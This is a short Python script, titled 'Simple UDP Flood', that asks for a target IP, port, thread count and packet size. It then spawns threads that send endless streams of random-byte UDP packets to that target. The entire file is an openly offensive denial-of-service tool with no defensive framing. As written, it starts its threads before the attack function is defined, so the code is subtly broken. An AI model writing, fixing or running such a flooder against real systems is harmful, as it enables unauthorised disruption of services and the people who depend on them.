# Simple UDP Flood
# -*- coding: utf-8 -*-
import os, sys
import threading
import random
import socket

print("""
  Simple UDP Flood
""")
ip = str(input("IP Target: "))
ip = socket.gethostbyname(ip)
port = int(input("Port Target: "))
threads = int(input("Threads: "))
conn = int(input("Multi Packet: "))
psize = int(input("Packet Size: "))
for x in range(threads):
  t = threading.Thread(target=attack)
  t.start()

def attack():
  pkt = random._urandom(psize)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      s.sendto(pkt, (ip,port))
      print("Sending "+str(len(pkt))+" to => "+ip+":"+str(port))
      for y in range(conn):
        s.sendto(pkt, (ip,port))
    except:
      s.close()
